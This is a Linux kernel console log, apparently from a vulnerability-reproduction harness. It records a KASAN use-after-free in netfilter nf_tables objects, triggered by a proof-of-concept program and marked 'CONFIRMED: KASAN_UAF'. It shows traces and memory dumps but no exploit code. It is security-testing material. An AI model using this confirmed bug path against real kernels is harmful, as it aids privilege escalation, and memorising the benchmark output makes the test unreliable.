[    2.429264]  ? __alloc_skb+0xd4/0x280
[    2.429834]  ? netlink_sendmsg+0x83a/0xc60
[    2.430438]  ? sock_sendmsg+0x13d/0x180
[    2.431009]  ? __sys_sendto+0x1eb/0x2b0
[    2.431586]  ? __x64_sys_sendto+0xdb/0x1b0
[    2.432187]  ? do_syscall_64+0x3b/0x90
[    2.432762]  netlink_rcv_skb+0x12f/0x370
[    2.433354]  ? __pfx_nfnetlink_rcv_msg+0x10/0x10
[    2.434128]  ? cred_has_capability.isra.0+0x13a/0x230
[    2.435162]  ? __pfx_netlink_rcv_skb+0x10/0x10
[    2.435864]  ? __pfx_cred_has_capability.isra.0+0x10/0x10
[    2.436665]  ? security_capable+0x6c/0xb0
[    2.437256]  nfnetlink_rcv+0x14b/0x360
[    2.437827]  ? __pfx_nfnetlink_rcv+0x10/0x10
[    2.438470]  ? kmalloc_reserve+0x110/0x1e0
[    2.439118]  netlink_unicast+0x588/0x7f0
[    2.439731]  ? __pfx_netlink_unicast+0x10/0x10
[    2.440400]  netlink_sendmsg+0x7b7/0xc60
[    2.441189]  ? __pfx_netlink_sendmsg+0x10/0x10
[    2.442056]  ? __pfx_netlink_sendmsg+0x10/0x10
[    2.442931]  sock_sendmsg+0x13d/0x180
[    2.443748]  __sys_sendto+0x1eb/0x2b0
[    2.444511]  ? __pfx___sys_sendto+0x10/0x10
[    2.445231]  ? _raw_spin_lock_irq+0x81/0xe0
[    2.446189]  ? __rseq_handle_notify_resume+0x7ce/0xc20
[    2.448592]  ? __pfx__raw_spin_lock_irq+0x10/0x10
[    2.449360]  ? ksys_write+0xf9/0x1d0
[    2.449901]  __x64_sys_sendto+0xdb/0x1b0
[    2.450480]  ? exit_to_user_mode_prepare+0x2a/0x110
[    2.451242]  ? syscall_exit_to_user_mode+0x21/0x50
[    2.451898]  do_syscall_64+0x3b/0x90
[    2.452488]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    2.453277] RIP: 0033:0x44fba3
[    2.453664] Code: 48 c7 c3 ff ff ff ff 64 89 02 eb bd 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d 81 57 07 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    2.456338] RSP: 002b:00007ffc06367ee8 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    2.457345] RAX: ffffffffffffffda RBX: 00000000011356f0 RCX: 000000000044fba3
[    2.458462] RDX: 0000000000000028 RSI: 00000000011356f0 RDI: 0000000000000003
[    2.459848] RBP: 0000000001147da0 R08: 000000000048fcc8 R09: 000000000000000c
[    2.460861] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000080
[    2.461615] R13: 0000000001147da0 R14: 00007ffc06367f10 R15: 00000000011356d0
[    2.462864]  </TASK>
[    2.463413] 
[    2.463759] Allocated by task 61:
[    2.464432]  kasan_save_stack+0x33/0x60
[    2.465229]  kasan_set_track+0x25/0x30
[    2.465894]  __kasan_kmalloc+0x8f/0xa0
[    2.466518]  __kmalloc+0x59/0x160
[    2.467091]  nft_obj_init+0x186/0x310
[    2.467867]  nf_tables_newobj+0x933/0x1650
[    2.468663]  nfnetlink_rcv_batch+0x129a/0x1fc0
[    2.469348]  nfnetlink_rcv+0x2df/0x360
[    2.469934]  netlink_unicast+0x588/0x7f0
[    2.470490]  netlink_sendmsg+0x7b7/0xc60
[    2.471030]  sock_sendmsg+0x13d/0x180
[    2.471525]  __sys_sendto+0x1eb/0x2b0
[    2.472010]  __x64_sys_sendto+0xdb/0x1b0
[    2.472581]  do_syscall_64+0x3b/0x90
[    2.473139]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    2.473799] 
[    2.474033] Freed by task 47:
[    2.474515]  kasan_save_stack+0x33/0x60
[    2.475082]  kasan_set_track+0x25/0x30
[    2.475626]  kasan_save_free_info+0x2b/0x50
[    2.476256]  __kasan_slab_free+0x10a/0x180
[    2.476802]  __kmem_cache_free+0x82/0x1c0
[    2.477370]  nf_tables_trans_destroy_work+0x49f/0xb10
[    2.478258]  process_one_work+0x801/0x1500
[    2.478856]  worker_thread+0x7e2/0x1390
[    2.479617]  kthread+0x29b/0x370
[    2.480077]  ret_from_fork+0x29/0x50
[    2.480717] 
[    2.480963] The buggy address belongs to the object at ffff888103b6b000
[    2.480963]  which belongs to the cache kmalloc-256 of size 256
[    2.483017] The buggy address is located 32 bytes inside of
[    2.483017]  freed 256-byte region [ffff888103b6b000, ffff888103b6b100)
[    2.484952] 
[    2.485185] The buggy address belongs to the physical page:
[    2.486018] page:0000000092b03710 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x103b6a
[    2.487664] head:0000000092b03710 order:1 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    2.489010] flags: 0x200000000010200(slab|head|node=0|zone=2)
[    2.489830] page_type: 0xffffffff()
[    2.490377] raw: 0200000000010200 ffff888100041b40 dead000000000122 0000000000000000
[    2.491320] raw: 0000000000000000 0000000080100010 00000001ffffffff 0000000000000000
[    2.492464] page dumped because: kasan: bad access detected
[    2.493159] 
[    2.493420] Memory state around the buggy address:
[    2.494087]  ffff888103b6af00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    2.495116]  ffff888103b6af80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    2.496148] >ffff888103b6b000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    2.497225]                                ^
[    2.497820]  ffff888103b6b080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    2.498833]  ffff888103b6b100: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    2.499897] ==================================================================
[    2.501154] Disabling lock debugging due to kernel taint
[+] poc finished
[    2.503249] poc (61) used greatest stack depth: 24504 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    2.506193] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    3.842658] ACPI: PM: Preparing to enter system sleep state S5
[    3.844466] reboot: Power down
CONFIRMED: KASAN_UAF
